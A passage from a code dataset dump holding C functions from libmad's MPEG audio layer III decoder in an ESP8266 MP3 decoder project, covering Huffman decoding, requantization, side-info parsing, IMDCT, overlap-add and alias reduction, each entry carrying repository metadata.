MAD_F_MLA(hi, lo, X[15],  MAD_F(0x0898c779));\n  MAD_F_MLA(hi, lo, X[17], -MAD_F(0x0acf37ad));\n\n  x[18] = x[35] = MAD_F_MLZ(hi, lo) - t1;\n\n  MAD_F_ML0(hi, lo, X[4],   MAD_F(0x061f78aa));\n  MAD_F_MLA(hi, lo, X[13], -MAD_F(0x0ec835e8));\n\n  t7 = MAD_F_MLZ(hi, lo);\n\n  MAD_F_MLA(hi, lo, X[1],  -MAD_F(0x0cb19346));\n  MAD_F_MLA(hi, lo, X[7],   MAD_F(0x0fdcf549));\n  MAD_F_MLA(hi, lo, X[10],  MAD_F(0x0216a2a2));\n  MAD_F_MLA(hi, lo, X[16], -MAD_F(0x09bd7ca0));\n\n  t2 = MAD_F_MLZ(hi, lo);\n\n  MAD_F_MLA(hi, lo, X[0],   MAD_F(0x04cfb0e2));\n  MAD_F_MLA(hi, lo, X[2],   MAD_F(0x0ffc19fd));\n  MAD_F_MLA(hi, lo, X[3],  -MAD_F(0x0d7e8807));\n  MAD_F_MLA(hi, lo, X[5],   MAD_F(0x03768962));\n  MAD_F_MLA(hi, lo, X[6],  -MAD_F(0x0bcbe352));\n  MAD_F_MLA(hi, lo, X[8],  -MAD_F(0x0e313245));\n  MAD_F_MLA(hi, lo, X[9],   MAD_F(0x07635284));\n  MAD_F_MLA(hi, lo, X[11], -MAD_F(0x0acf37ad));\n  MAD_F_MLA(hi, lo, X[12],  MAD_F(0x0f9ee890));\n  MAD_F_MLA(hi, lo, X[14],  MAD_F(0x0898c779));\n  MAD_F_MLA(hi, lo, X[15],  MAD_F(0x00b2aa3e));\n  MAD_F_MLA(hi, lo, X[17],  MAD_F(0x0f426cb5));\n\n  x[5]  = MAD_F_MLZ(hi, lo);\n  x[12] = -x[5];\n\n  MAD_F_ML0(hi, lo, X[0],   MAD_F(0x0acf37ad));\n  MAD_F_MLA(hi, lo, X[2],  -MAD_F(0x0898c779));\n  MAD_F_MLA(hi, lo, X[3],   MAD_F(0x0e313245));\n  MAD_F_MLA(hi, lo, X[5],  -MAD_F(0x0f426cb5));\n  MAD_F_MLA(hi, lo, X[6],  -MAD_F(0x03768962));\n  MAD_F_MLA(hi, lo, X[8],   MAD_F(0x00b2aa3e));\n  MAD_F_MLA(hi, lo, X[9],  -MAD_F(0x0ffc19fd));\n  MAD_F_MLA(hi, lo, X[11],  MAD_F(0x0f9ee890));\n  MAD_F_MLA(hi, lo, X[12], -MAD_F(0x04cfb0e2));\n  MAD_F_MLA(hi, lo, X[14],  MAD_F(0x07635284));\n  MAD_F_MLA(hi, lo, X[15],  MAD_F(0x0d7e8807));\n  MAD_F_MLA(hi, lo, X[17], -MAD_F(0x0bcbe352));\n\n  x[0]  = MAD_F_MLZ(hi, lo) + t2;\n  x[17] = -x[0];\n\n  MAD_F_ML0(hi, lo, X[0],  -MAD_F(0x0f9ee890));\n  MAD_F_MLA(hi, lo, X[2],  -MAD_F(0x07635284));\n  MAD_F_MLA(hi, lo, X[3],  -MAD_F(0x00b2aa3e));\n  MAD_F_MLA(hi, lo, X[5],   MAD_F(0x0bcbe352));\n  MAD_F_MLA(hi, lo, X[6],   MAD_F(0x0f426cb5));\n  MAD_F_MLA(hi, lo, X[8],   MAD_F(0x0d7e8807));\n  MAD_F_MLA(hi, lo, X[9],   MAD_F(0x0898c779));\n  MAD_F_MLA(hi, lo, X[11], -MAD_F(0x04cfb0e2));\n  MAD_F_MLA(hi, lo, X[12], -MAD_F(0x0acf37ad));\n  MAD_F_MLA(hi, lo, X[14], -MAD_F(0x0ffc19fd));\n  MAD_F_MLA(hi, lo, X[15], -MAD_F(0x0e313245));\n  MAD_F_MLA(hi, lo, X[17], -MAD_F(0x03768962));\n\n  x[24] = x[29] = MAD_F_MLZ(hi, lo) + t2;\n\n  MAD_F_ML0(hi, lo, X[1],  -MAD_F(0x0216a2a2));\n  MAD_F_MLA(hi, lo, X[7],  -MAD_F(0x09bd7ca0));\n  MAD_F_MLA(hi, lo, X[10],  MAD_F(0x0cb19346));\n  MAD_F_MLA(hi, lo, X[16],  MAD_F(0x0fdcf549));\n\n  t3 = MAD_F_MLZ(hi, lo) + t7;\n\n  MAD_F_ML0(hi, lo, X[0],   MAD_F(0x00b2aa3e));\n  MAD_F_MLA(hi, lo, X[2],   MAD_F(0x03768962));\n  MAD_F_MLA(hi, lo, X[3],  -MAD_F(0x04cfb0e2));\n  MAD_F_MLA(hi, lo, X[5],  -MAD_F(0x07635284));\n  MAD_F_MLA(hi, lo, X[6],   MAD_F(0x0898c779));\n  MAD_F_MLA(hi, lo, X[8],   MAD_F(0x0acf37ad));\n  MAD_F_MLA(hi, lo, X[9],  -MAD_F(0x0bcbe352));\n  MAD_F_MLA(hi, lo, X[11], -MAD_F(0x0d7e8807));\n  MAD_F_MLA(hi, lo, X[12],  MAD_F(0x0e313245));\n  MAD_F_MLA(hi, lo, X[14],  MAD_F(0x0f426cb5));\n  MAD_F_MLA(hi, lo, X[15], -MAD_F(0x0f9ee890));\n  MAD_F_MLA(hi, lo, X[17], -MAD_F(0x0ffc19fd));\n\n  x[8] = MAD_F_MLZ(hi, lo) + t3;\n  x[9] = -x[8];\n\n  MAD_F_ML0(hi, lo, X[0],  -MAD_F(0x0e313245));\n  MAD_F_MLA(hi, lo, X[2],   MAD_F(0x0bcbe352));\n  MAD_F_MLA(hi, lo, X[3],   MAD_F(0x0f9ee890));\n  MAD_F_MLA(hi, lo, X[5],  -MAD_F(0x0898c779));\n  MAD_F_MLA(hi, lo, X[6],  -MAD_F(0x0ffc19fd));\n  MAD_F_MLA(hi, lo, X[8],   MAD_F(0x04cfb0e2));\n  MAD_F_MLA(hi, lo, X[9],   MAD_F(0x0f426cb5));\n  MAD_F_MLA(hi, lo, X[11], -MAD_F(0x00b2aa3e));\n  MAD_F_MLA(hi, lo, X[12], -MAD_F(0x0d7e8807));\n  MAD_F_MLA(hi, lo, X[14], -MAD_F(0x03768962));\n  MAD_F_MLA(hi, lo, X[15],  MAD_F(0x0acf37ad));\n  MAD_F_MLA(hi, lo, X[17],  MAD_F(0x07635284));\n\n  x[21] = x[32] = MAD_F_MLZ(hi, lo) + t3;\n\n  MAD_F_ML0(hi, lo, X[0],  -MAD_F(0x0d7e8807));\n  MAD_F_MLA(hi, lo, X[2],   MAD_F(0x0f426cb5));\n  MAD_F_MLA(hi, lo, X[3],   MAD_F(0x0acf37ad));\n  MAD_F_MLA(hi, lo, X[5],  -MAD_F(0x0ffc19fd));\n  MAD_F_MLA(hi, lo, X[6],  -MAD_F(0x07635284));\n  MAD_F_MLA(hi, lo, X[8],   MAD_F(0x0f9ee890));\n  MAD_F_MLA(hi, lo, X[9],   MAD_F(0x03768962));\n  MAD_F_MLA(hi, lo, X[11], -MAD_F(0x0e313245));\n  MAD_F_MLA(hi, lo, X[12],  MAD_F(0x00b2aa3e));\n  MAD_F_MLA(hi, lo, X[14],  MAD_F(0x0bcbe352));\n  MAD_F_MLA(hi, lo, X[15], -MAD_F(0x04cfb0e2));\n  MAD_F_MLA(hi, lo, X[17], -MAD_F(0x0898c779));\n\n  x[20] = x[33] = MAD_F_MLZ(hi, lo) - t3;\n\n  MAD_F_ML0(hi, lo, t14, -MAD_F(0x0ec835e8));\n  MAD_F_MLA(hi, lo, t15,  MAD_F(0x061f78aa));\n\n  t4 = MAD_F_MLZ(hi, lo) - t7;\n\n  MAD_F_ML0(hi, lo, t12, MAD_F(0x061f78aa));\n  MAD_F_MLA(hi, lo, t13, MAD_F(0x0ec835e8));\n\n  x[4]  = MAD_F_MLZ(hi, lo) + t4;\n  x[13] = -x[4];\n\n  MAD_F_ML0(hi, lo, t8,   MAD_F(0x09bd7ca0));\n  MAD_F_MLA(hi, lo, t9,  -MAD_F(0x0216a2a2));\n  MAD_F_MLA(hi, lo, t10,  MAD_F(0x0fdcf549));\n  MAD_F_MLA(hi, lo, t11, -MAD_F(0x0cb19346));\n\n  x[1]  = MAD_F_MLZ(hi, lo) + t4;\n  x[16] = -x[1];\n\n  MAD_F_ML0(hi, lo, t8,  -MAD_F(0x0fdcf549));\n  MAD_F_MLA(hi, lo, t9,  -MAD_F(0x0cb19346));\n  MAD_F_MLA(hi, lo, t10, -MAD_F(0x09bd7ca0));\n  MAD_F_MLA(hi, lo, t11, -MAD_F(0x0216a2a2));\n\n  x[25] = x[28] = MAD_F_MLZ(hi, lo) + t4;\n\n  MAD_F_ML0(hi, lo, X[1],  -MAD_F(0x0fdcf549));\n  MAD_F_MLA(hi, lo, X[7],  -MAD_F(0x0cb19346));\n  MAD_F_MLA(hi, lo, X[10], -MAD_F(0x09bd7ca0));\n  MAD_F_MLA(hi, lo, X[16], -MAD_F(0x0216a2a2));\n\n  t5 = MAD_F_MLZ(hi, lo) - t6;\n\n  MAD_F_ML0(hi, lo, X[0],   MAD_F(0x0898c779));\n  MAD_F_MLA(hi, lo, X[2],   MAD_F(0x04cfb0e2));\n  MAD_F_MLA(hi, lo, X[3],   MAD_F(0x0bcbe352));\n  MAD_F_MLA(hi, lo, X[5],   MAD_F(0x00b2aa3e));\n  MAD_F_MLA(hi, lo, X[6],   MAD_F(0x0e313245));\n  MAD_F_MLA(hi, lo, X[8],  -MAD_F(0x03768962));\n  MAD_F_MLA(hi, lo, X[9],   MAD_F(0x0f9ee890));\n  MAD_F_MLA(hi, lo, X[11], -MAD_F(0x07635284));\n  MAD_F_MLA(hi, lo, X[12],  MAD_F(0x0ffc19fd));\n  MAD_F_MLA(hi, lo, X[14], -MAD_F(0x0acf37ad));\n  MAD_F_MLA(hi, lo, X[15],  MAD_F(0x0f426cb5));\n  MAD_F_MLA(hi, lo, X[17], -MAD_F(0x0d7e8807));\n\n  x[2]  = MAD_F_MLZ(hi, lo) + t5;\n  x[15] = -x[2];\n\n  MAD_F_ML0(hi, lo, X[0],   MAD_F(0x07635284));\n  MAD_F_MLA(hi, lo, X[2],   MAD_F(0x0acf37ad));\n  MAD_F_MLA(hi, lo, X[3],   MAD_F(0x03768962));\n  MAD_F_MLA(hi, lo, X[5],   MAD_F(0x0d7e8807));\n  MAD_F_MLA(hi, lo, X[6],  -MAD_F(0x00b2aa3e));\n  MAD_F_MLA(hi, lo, X[8],   MAD_F(0x0f426cb5));\n  MAD_F_MLA(hi, lo, X[9],  -MAD_F(0x04cfb0e2));\n  MAD_F_MLA(hi, lo, X[11],  MAD_F(0x0ffc19fd));\n  MAD_F_MLA(hi, lo, X[12], -MAD_F(0x0898c779));\n  MAD_F_MLA(hi, lo, X[14],  MAD_F(0x0f9ee890));\n  MAD_F_MLA(hi, lo, X[15], -MAD_F(0x0bcbe352));\n  MAD_F_MLA(hi, lo, X[17],  MAD_F(0x0e313245));\n\n  x[3]  = MAD_F_MLZ(hi, lo) + t5;\n  x[14] = -x[3];\n\n  MAD_F_ML0(hi, lo, X[0],  -MAD_F(0x0ffc19fd));\n  MAD_F_MLA(hi, lo, X[2],  -MAD_F(0x0f9ee890));\n  MAD_F_MLA(hi, lo, X[3],  -MAD_F(0x0f426cb5));\n  MAD_F_MLA(hi, lo, X[5],  -MAD_F(0x0e313245));\n  MAD_F_MLA(hi, lo, X[6],  -MAD_F(0x0d7e8807));\n  MAD_F_MLA(hi, lo, X[8],  -MAD_F(0x0bcbe352));\n  MAD_F_MLA(hi, lo, X[9],  -MAD_F(0x0acf37ad));\n  MAD_F_MLA(hi, lo, X[11], -MAD_F(0x0898c779));\n  MAD_F_MLA(hi, lo, X[12], -MAD_F(0x07635284));\n  MAD_F_MLA(hi, lo, X[14], -MAD_F(0x04cfb0e2));\n  MAD_F_MLA(hi, lo, X[15], -MAD_F(0x03768962));\n  MAD_F_MLA(hi, lo, X[17], -MAD_F(0x00b2aa3e));\n\n  x[26] = x[27] = MAD_F_MLZ(hi, lo) + t5;\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n * NAME:\tIII_overlap()\n * DESCRIPTION:\tperform overlap-add of windowed IMDCT outputs\n */\n", "func_signal": "static\nvoid ICACHE_FLASH_ATTR III_overlap(mad_fixed_t const output[36], mad_fixed_t overlap[18],\n\t\t mad_fixed_t sample[18][32], unsigned int sb)", "code": "{\n  unsigned int i;\n\n# if defined(ASO_INTERLEAVE2)\n  {\n    register mad_fixed_t tmp1, tmp2;\n\n    tmp1 = overlap[0];\n    tmp2 = overlap[1];\n\n    for (i = 0; i < 16; i += 2) {\n      sample[i + 0][sb] = output[i + 0 +  0] + tmp1;\n      overlap[i + 0]    = output[i + 0 + 18];\n      tmp1 = overlap[i + 2];\n\n      sample[i + 1][sb] = output[i + 1 +  0] + tmp2;\n      overlap[i + 1]    = output[i + 1 + 18];\n      tmp2 = overlap[i + 3];\n    }\n\n    sample[16][sb] = output[16 +  0] + tmp1;\n    overlap[16]    = output[16 + 18];\n    sample[17][sb] = output[17 +  0] + tmp2;\n    overlap[17]    = output[17 + 18];\n  }\n# elif 0\n  for (i = 0; i < 18; i += 2) {\n    sample[i + 0][sb] = output[i + 0 +  0] + overlap[i + 0];\n    overlap[i + 0]    = output[i + 0 + 18];\n\n    sample[i + 1][sb] = output[i + 1 +  0] + overlap[i + 1];\n    overlap[i + 1]    = output[i + 1 + 18];\n  }\n# else\n  for (i = 0; i < 18; ++i) {\n    sample[i][sb] = output[i +  0] + overlap[i];\n    overlap[i]    = output[i + 18];\n  }\n# endif\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n * NAME:\tIII_requantize()\n * DESCRIPTION:\trequantize one (positive) value\n */\n", "func_signal": "static\nmad_fixed_t ICACHE_FLASH_ATTR III_requantize(unsigned int value, signed int exp)", "code": "{\n  mad_fixed_t requantized;\n  signed int frac;\n  struct fixedfloat const *power;\n\n  frac = exp % 4;  /* assumes sign(frac) == sign(exp) */\n  exp /= 4;\n\n  power = &rq_table[value];\n  requantized = power->mantissa;\n  exp += power->exponent;\n\n  if (exp < 0) {\n    if (-exp >= sizeof(mad_fixed_t) * CHAR_BIT) {\n      /* underflow */\n      requantized = 0;\n    }\n    else {\n      requantized += 1L << (-exp - 1);\n      requantized >>= -exp;\n    }\n  }\n  else {\n    if (exp >= 5) {\n      /* overflow */\n# if defined(DEBUG)\n      fprintf(stderr, \"requantize overflow (%f * 2^%d)\\n\",\n\t      mad_f_todouble(requantized), exp);\n# endif\n      requantized = MAD_F_MAX;\n    }\n    else\n      requantized <<= exp;\n  }\n\n  return frac ? mad_f_mul(requantized, root_table[3 + frac]) : requantized;\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n * NAME:\timdct36\n * DESCRIPTION:\tperform X[18]->x[36] IMDCT using Szu-Wei Lee's fast algorithm\n */\n", "func_signal": "static inline\nvoid ICACHE_FLASH_ATTR imdct36(mad_fixed_t const x[18], mad_fixed_t y[36])", "code": "{\n  mad_fixed_t tmp[18];\n  int i;\n\n  /* DCT-IV */\n\n  dctIV(x, tmp);\n\n  /* convert 18-point DCT-IV to 36-point IMDCT */\n\n  for (i =  0; i <  9; i += 3) {\n    y[i + 0] =  tmp[9 + (i + 0)];\n    y[i + 1] =  tmp[9 + (i + 1)];\n    y[i + 2] =  tmp[9 + (i + 2)];\n  }\n  for (i =  9; i < 27; i += 3) {\n    y[i + 0] = -tmp[36 - (9 + (i + 0)) - 1];\n    y[i + 1] = -tmp[36 - (9 + (i + 1)) - 1];\n    y[i + 2] = -tmp[36 - (9 + (i + 2)) - 1];\n  }\n  for (i = 27; i < 36; i += 3) {\n    y[i + 0] = -tmp[(i + 0) - 27];\n    y[i + 1] = -tmp[(i + 1) - 27];\n    y[i + 2] = -tmp[(i + 2) - 27];\n  }\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n * NAME:\tIII_huffdecode()\n * DESCRIPTION:\tdecode Huffman code words of one channel of one granule\n */\n", "func_signal": "static\nenum mad_error ICACHE_FLASH_ATTR III_huffdecode(struct mad_bitptr *ptr, mad_fixed_t xr[576],\n\t\t\t      struct channel *channel,\n\t\t\t      unsigned char const *sfbwidth,\n\t\t\t      unsigned int part2_length)", "code": "{\n  signed int exponents[39], exp;\n  signed int const *expptr;\n  struct mad_bitptr peek;\n  signed int bits_left, cachesz;\n  register mad_fixed_t *xrptr;\n  mad_fixed_t const *sfbound;\n  register unsigned long bitcache;\n\n  bits_left = (signed) channel->part2_3_length - (signed) part2_length;\n  if (bits_left < 0)\n    return MAD_ERROR_BADPART3LEN;\n\n  III_exponents(channel, sfbwidth, exponents);\n\n  peek = *ptr;\n  mad_bit_skip(ptr, bits_left);\n\n  /* align bit reads to byte boundaries */\n  cachesz  = mad_bit_bitsleft(&peek);\n  cachesz += ((32 - 1 - 24) + (24 - cachesz)) & ~7;\n\n  bitcache   = mad_bit_read(&peek, cachesz);\n  bits_left -= cachesz;\n\n  xrptr = &xr[0];\n\n  /* big_values */\n  {\n    unsigned int region, rcount;\n    struct hufftable const *entry;\n    union huffpair const *table;\n    unsigned int linbits, startbits, big_values, reqhits;\n    mad_fixed_t reqcache[16];\n\n    sfbound = xrptr + unalChar(sfbwidth++);\n    rcount  = channel->region0_count + 1;\n\n    entry     = &mad_huff_pair_table[channel->table_select[region = 0]];\n    table     = entry->table;\n    linbits   = entry->linbits;\n    startbits = entry->startbits;\n\n    if (table == 0)\n      return MAD_ERROR_BADHUFFTABLE;\n\n    expptr  = &exponents[0];\n    exp     = *expptr++;\n    reqhits = 0;\n\n    big_values = channel->big_values;\n\n    while (big_values-- && cachesz + bits_left > 0) {\n      union huffpair const *pair;\n      unsigned int clumpsz, value;\n      register mad_fixed_t requantized;\n\n      if (xrptr == sfbound) {\n\tsfbound += unalChar(sfbwidth++);\n\n\t/* change table if region boundary */\n\n\tif (--rcount == 0) {\n\t  if (region == 0)\n\t    rcount = channel->region1_count + 1;\n\t  else\n\t    rcount = 0;  /* all remaining */\n\n\t  entry     = &mad_huff_pair_table[channel->table_select[++region]];\n\t  table     = entry->table;\n\t  linbits   = entry->linbits;\n\t  startbits = entry->startbits;\n\n\t  if (table == 0)\n\t    return MAD_ERROR_BADHUFFTABLE;\n\t}\n\n\tif (exp != *expptr) {\n\t  exp = *expptr;\n\t  reqhits = 0;\n\t}\n\n\t++expptr;\n      }\n\n      if (cachesz < 21) {\n\tunsigned int bits;\n\n\tbits       = ((32 - 1 - 21) + (21 - cachesz)) & ~7;\n\tbitcache   = (bitcache << bits) | mad_bit_read(&peek, bits);\n\tcachesz   += bits;\n\tbits_left -= bits;\n      }\n\n      /* hcod (0..19) */\n\n      clumpsz = startbits;\n      pair    = &table[MASK(bitcache, cachesz, clumpsz)];\n\n      while (!pair->final) {\n\tcachesz -= clumpsz;\n\n\tclumpsz = pair->ptr.bits;\n\tpair    = &table[pair->ptr.offset + MASK(bitcache, cachesz, clumpsz)];\n      }\n\n      cachesz -= pair->value.hlen;\n\n      if (linbits) {\n\t/* x (0..14) */\n\n\tvalue = pair->value.x;\n\n\tswitch (value) {\n\tcase 0:\n\t  xrptr[0] = 0;\n\t  break;\n\n\tcase 15:\n\t  if (cachesz < linbits + 2) {\n\t    bitcache   = (bitcache << 16) | mad_bit_read(&peek, 16);\n\t    cachesz   += 16;\n\t    bits_left -= 16;\n\t  }\n\n\t  value += MASK(bitcache, cachesz, linbits);\n\t  cachesz -= linbits;\n\n\t  requantized = III_requantize(value, exp);\n\t  goto x_final;\n\n\tdefault:\n\t  if (reqhits & (1 << value))\n\t    requantized = reqcache[value];\n\t  else {\n\t    reqhits |= (1 << value);\n\t    requantized = reqcache[value] = III_requantize(value, exp);\n\t  }\n\n\tx_final:\n\t  xrptr[0] = MASK1BIT(bitcache, cachesz--) ?\n\t    -requantized : requantized;\n\t}\n\n\t/* y (0..14) */\n\n\tvalue = pair->value.y;\n\n\tswitch (value) {\n\tcase 0:\n\t  xrptr[1] = 0;\n\t  break;\n\n\tcase 15:\n\t  if (cachesz < linbits + 1) {\n\t    bitcache   = (bitcache << 16) | mad_bit_read(&peek, 16);\n\t    cachesz   += 16;\n\t    bits_left -= 16;\n\t  }\n\n\t  value += MASK(bitcache, cachesz, linbits);\n\t  cachesz -= linbits;\n\n\t  requantized = III_requantize(value, exp);\n\t  goto y_final;\n\n\tdefault:\n\t  if (reqhits & (1 << value))\n\t    requantized = reqcache[value];\n\t  else {\n\t    reqhits |= (1 << value);\n\t    requantized = reqcache[value] = III_requantize(value, exp);\n\t  }\n\n\ty_final:\n\t  xrptr[1] = MASK1BIT(bitcache, cachesz--) ?\n\t    -requantized : requantized;\n\t}\n      }\n      else {\n\t/* x (0..1) */\n\n\tvalue = pair->value.x;\n\n\tif (value == 0)\n\t  xrptr[0] = 0;\n\telse {\n\t  if (reqhits & (1 << value))\n\t    requantized = reqcache[value];\n\t  else {\n\t    reqhits |= (1 << value);\n\t    requantized = reqcache[value] = III_requantize(value, exp);\n\t  }\n\n\t  xrptr[0] = MASK1BIT(bitcache, cachesz--) ?\n\t    -requantized : requantized;\n\t}\n\n\t/* y (0..1) */\n\n\tvalue = pair->value.y;\n\n\tif (value == 0)\n\t  xrptr[1] = 0;\n\telse {\n\t  if (reqhits & (1 << value))\n\t    requantized = reqcache[value];\n\t  else {\n\t    reqhits |= (1 << value);\n\t    requantized = reqcache[value] = III_requantize(value, exp);\n\t  }\n\n\t  xrptr[1] = MASK1BIT(bitcache, cachesz--) ?\n\t    -requantized : requantized;\n\t}\n      }\n\n      xrptr += 2;\n    }\n  }\n\n  if (cachesz + bits_left < 0)\n    return MAD_ERROR_BADHUFFDATA;  /* big_values overrun */\n\n  /* count1 */\n  {\n    union huffquad const *table;\n    register mad_fixed_t requantized;\n\n    table = mad_huff_quad_table[channel->flags & count1table_select];\n\n    requantized = III_requantize(1, exp);\n\n    while (cachesz + bits_left > 0 && xrptr <= &xr[572]) {\n      union huffquad const *quad;\n\n      /* hcod (1..6) */\n\n      if (cachesz < 10) {\n\tbitcache   = (bitcache << 16) | mad_bit_read(&peek, 16);\n\tcachesz   += 16;\n\tbits_left -= 16;\n      }\n\n      quad = &table[MASK(bitcache, cachesz, 4)];\n\n      /* quad tables guaranteed to have at most one extra lookup */\n      if (!quad->final) {\n\tcachesz -= 4;\n\n\tquad = &table[quad->ptr.offset +\n\t\t      MASK(bitcache, cachesz, quad->ptr.bits)];\n      }\n\n      cachesz -= quad->value.hlen;\n\n      if (xrptr == sfbound) {\n\tsfbound += unalChar(sfbwidth++);\n\n\tif (exp != *expptr) {\n\t  exp = *expptr;\n\t  requantized = III_requantize(1, exp);\n\t}\n\n\t++expptr;\n      }\n\n      /* v (0..1) */\n\n      xrptr[0] = quad->value.v ?\n\t(MASK1BIT(bitcache, cachesz--) ? -requantized : requantized) : 0;\n\n      /* w (0..1) */\n\n      xrptr[1] = quad->value.w ?\n\t(MASK1BIT(bitcache, cachesz--) ? -requantized : requantized) : 0;\n\n      xrptr += 2;\n\n      if (xrptr == sfbound) {\n\tsfbound += unalChar(sfbwidth++);\n\n\tif (exp != *expptr) {\n\t  exp = *expptr;\n\t  requantized = III_requantize(1, exp);\n\t}\n\n\t++expptr;\n      }\n\n      /* x (0..1) */\n\n      xrptr[0] = quad->value.x ?\n\t(MASK1BIT(bitcache, cachesz--) ? -requantized : requantized) : 0;\n\n      /* y (0..1) */\n\n      xrptr[1] = quad->value.y ?\n\t(MASK1BIT(bitcache, cachesz--) ? -requantized : requantized) : 0;\n\n      xrptr += 2;\n    }\n\n    if (cachesz + bits_left < 0) {\n# if 0 && defined(DEBUG)\n      fprintf(stderr, \"huffman count1 overrun (%d bits)\\n\",\n\t      -(cachesz + bits_left));\n# endif\n\n      /* technically the bitstream is misformatted, but apparently\n\t some encoders are just a bit sloppy with stuffing bits */\n\n      xrptr -= 4;\n    }\n  }\n\n  assert(-bits_left <= MAD_BUFFER_GUARD * CHAR_BIT);\n\n# if 0 && defined(DEBUG)\n  if (bits_left < 0)\n    fprintf(stderr, \"read %d bits too many\\n\", -bits_left);\n  else if (cachesz + bits_left > 0)\n    fprintf(stderr, \"%d stuffing bits\\n\", cachesz + bits_left);\n# endif\n\n  /* rzero */\n  while (xrptr < &xr[576]) {\n    xrptr[0] = 0;\n    xrptr[1] = 0;\n\n    xrptr += 2;\n  }\n\n  return MAD_ERROR_NONE;\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n * NAME:\tIII_sideinfo()\n * DESCRIPTION:\tdecode frame side information from a bitstream\n */\n", "func_signal": "static\nenum mad_error ICACHE_FLASH_ATTR III_sideinfo(struct mad_bitptr *ptr, unsigned int nch,\n\t\t\t    int lsf, struct sideinfo *si,\n\t\t\t    unsigned int *data_bitlen,\n\t\t\t    unsigned int *priv_bitlen)", "code": "{\n  unsigned int ngr, gr, ch, i;\n  enum mad_error result = MAD_ERROR_NONE;\n\n  *data_bitlen = 0;\n  *priv_bitlen = lsf ? ((nch == 1) ? 1 : 2) : ((nch == 1) ? 5 : 3);\n\n  si->main_data_begin = mad_bit_read(ptr, lsf ? 8 : 9);\n  si->private_bits    = mad_bit_read(ptr, *priv_bitlen);\n\n  ngr = 1;\n  if (!lsf) {\n    ngr = 2;\n\n    for (ch = 0; ch < nch; ++ch)\n      si->scfsi[ch] = mad_bit_read(ptr, 4);\n  }\n\n  for (gr = 0; gr < ngr; ++gr) {\n    struct granule *granule = &si->gr[gr];\n\n    for (ch = 0; ch < nch; ++ch) {\n      struct channel *channel = &granule->ch[ch];\n\n      channel->part2_3_length    = mad_bit_read(ptr, 12);\n      channel->big_values        = mad_bit_read(ptr, 9);\n      channel->global_gain       = mad_bit_read(ptr, 8);\n      channel->scalefac_compress = mad_bit_read(ptr, lsf ? 9 : 4);\n\n      *data_bitlen += channel->part2_3_length;\n\n      if (channel->big_values > 288 && result == 0)\n\tresult = MAD_ERROR_BADBIGVALUES;\n\n      channel->flags = 0;\n\n      /* window_switching_flag */\n      if (mad_bit_read(ptr, 1)) {\n\tchannel->block_type = mad_bit_read(ptr, 2);\n\n\tif (channel->block_type == 0 && result == 0)\n\t  result = MAD_ERROR_BADBLOCKTYPE;\n\n\tif (!lsf && channel->block_type == 2 && si->scfsi[ch] && result == 0)\n\t  result = MAD_ERROR_BADSCFSI;\n\n\tchannel->region0_count = 7;\n\tchannel->region1_count = 36;\n\n\tif (mad_bit_read(ptr, 1))\n\t  channel->flags |= mixed_block_flag;\n\telse if (channel->block_type == 2)\n\t  channel->region0_count = 8;\n\n\tfor (i = 0; i < 2; ++i)\n\t  channel->table_select[i] = mad_bit_read(ptr, 5);\n\n# if defined(DEBUG)\n\tchannel->table_select[2] = 4;  /* not used */\n# endif\n\n\tfor (i = 0; i < 3; ++i)\n\t  channel->subblock_gain[i] = mad_bit_read(ptr, 3);\n      }\n      else {\n\tchannel->block_type = 0;\n\n\tfor (i = 0; i < 3; ++i)\n\t  channel->table_select[i] = mad_bit_read(ptr, 5);\n\n\tchannel->region0_count = mad_bit_read(ptr, 4);\n\tchannel->region1_count = mad_bit_read(ptr, 3);\n      }\n\n      /* [preflag,] scalefac_scale, count1table_select */\n      channel->flags |= mad_bit_read(ptr, lsf ? 2 : 3);\n    }\n  }\n\n  return result;\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n * NAME:\tIII_aliasreduce()\n * DESCRIPTION:\tperform frequency line alias reduction\n */\n", "func_signal": "static\nvoid ICACHE_FLASH_ATTR III_aliasreduce(mad_fixed_t xr[576], int lines)", "code": "{\n  mad_fixed_t const *bound;\n  int i;\n\n  bound = &xr[lines];\n  for (xr += 18; xr < bound; xr += 18) {\n    for (i = 0; i < 8; ++i) {\n      register mad_fixed_t a, b;\n      register mad_fixed64hi_t hi;\n      register mad_fixed64lo_t lo;\n\n      a = xr[-1 - i];\n      b = xr[     i];\n\n# if defined(ASO_ZEROCHECK)\n      if (a | b) {\n# endif\n\tMAD_F_ML0(hi, lo,  a, cs[i]);\n\tMAD_F_MLA(hi, lo, -b, ca[i]);\n\n\txr[-1 - i] = MAD_F_MLZ(hi, lo);\n\n\tMAD_F_ML0(hi, lo,  b, cs[i]);\n\tMAD_F_MLA(hi, lo,  a, ca[i]);\n\n\txr[     i] = MAD_F_MLZ(hi, lo);\n# if defined(ASO_ZEROCHECK)\n      }\n# endif\n    }\n  }\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
